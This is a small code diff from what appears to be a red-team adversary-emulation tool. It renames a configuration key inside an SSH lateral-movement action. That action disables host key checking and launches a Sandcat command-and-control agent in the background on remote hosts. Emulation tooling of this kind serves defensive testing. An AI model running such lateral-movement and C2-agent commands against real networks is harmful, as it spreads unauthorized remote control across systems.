@@ -13,7 +13,7 @@ class SSHLateralMove(LowLevelAction):
             f"ssh -o StrictHostKeyChecking=no "
             f"-o UserKnownHostsFile=/dev/null "
             f"-o ConnectTimeout=3 {hostname} "
-            f"'nohup ./sandcat_tmp.go -server {ConfigService().get_config().c2c_server} -group red 1>/dev/null 2>/dev/null &'"
+            f"'nohup ./sandcat_tmp.go -server {ConfigService().get_config().agent_c2c_server} -group red 1>/dev/null 2>/dev/null &'"
         )
         payloads = ["sandcat.go-linux"]
         super().__init__(agent, command, payloads, command_delay=3)
